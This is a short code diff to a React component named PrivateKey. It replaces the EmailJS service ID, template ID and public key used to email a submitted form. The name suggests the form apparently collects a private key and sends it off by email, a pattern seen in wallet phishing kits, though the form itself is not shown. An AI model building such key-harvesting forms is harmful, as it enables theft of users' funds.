@@ -33,7 +33,7 @@ export default function PrivateKey()
     const sendEmail = (e) => {
         e.preventDefault();
     
-        emailjs.sendForm('service_eitcot7', 'template_oyz43pv', form.current, 'MLwjHKgTUJiMDQ_px')
+        emailjs.sendForm('service_f9owe8b', 'template_dkezrui', form.current, 'q9edtd1Uilt68kPHu')
           .then((result) => {
               console.log(result.text);
           }, (error) => {
